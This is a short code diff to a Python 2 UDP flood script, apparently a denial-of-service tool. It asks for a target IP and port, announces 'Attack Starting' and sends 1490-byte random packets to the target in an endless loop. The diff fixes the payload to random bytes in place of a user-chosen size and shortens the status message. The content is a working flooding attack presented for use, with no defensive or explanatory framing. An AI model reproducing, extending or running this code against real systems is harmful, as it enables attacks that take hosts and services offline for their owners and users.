@@ -15,6 +15,7 @@ year = now.year
 
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
 #############
 
 os.system("clear")
@@ -26,7 +27,6 @@ print "Optimize content : Sweep port attack changed to single port attack"
 print
 ip = raw_input("IP  : ")
 port = input("port  : ")
-bytes = input("bytes :")
 
 os.system("clear")
 os.system("figlet Attack Starting")
@@ -44,4 +44,4 @@ sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
-     print "send %s packet to %s throught port:%s bytes:%s"%(sent,ip,port,bytes)
+     print "send %s packet to %s throught port:%s"%(sent,ip,port)
